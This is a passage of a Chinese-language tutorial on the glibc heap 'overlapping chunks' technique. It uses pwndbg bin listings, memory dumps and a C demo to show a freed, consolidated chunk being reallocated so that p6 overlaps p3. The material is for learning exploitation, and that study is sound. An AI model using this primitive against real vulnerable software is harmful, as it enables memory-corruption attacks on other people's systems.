可以发现，在 free 掉 chunk2 后，chunk2、chunk3 一起被释放。接着它发现紧邻的 chunk4 也是 free 状态，于是把它们合并到了一起，组成了一个大的 free chunk，放入了 unsorted bin 中。chunk5 的 prev_size 也发生了变化。

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6033f0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6033f0
smallbins
empty
largebins
empty
```

接下来我们申请一块新的 chunk 时，malloc 就会从 unsorted bin 中取出一部分：

``` c++
  fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, "\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");
  fprintf(stderr, "\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, "\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3); 
```

我们这里申请了 p6，它会将 chunk2 和 chunk3 都拿出来：

```
pwndbg> p p6
$4 = (intptr_t *) 0x603400
pwndbg> p p2
$5 = (intptr_t *) 0x603400
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603bd0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603bd0
smallbins
empty
largebins
empty
pwndbg> x/20xg 0x603bd0
0x603bd0:	0x4343434343434343	0x00000000000003f1
0x603be0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x603bf0:	0x4444444444444444	0x4444444444444444
0x603c00:	0x4444444444444444	0x4444444444444444
0x603c10:	0x4444444444444444	0x4444444444444444
0x603c20:	0x4444444444444444	0x4444444444444444
0x603c30:	0x4444444444444444	0x4444444444444444
0x603c40:	0x4444444444444444	0x4444444444444444
0x603c50:	0x4444444444444444	0x4444444444444444
0x603c60:	0x4444444444444444	0x4444444444444444
```

也就是说，这时候 chunk6 和 chunk 3 可以互相控制对方的内存数据了。
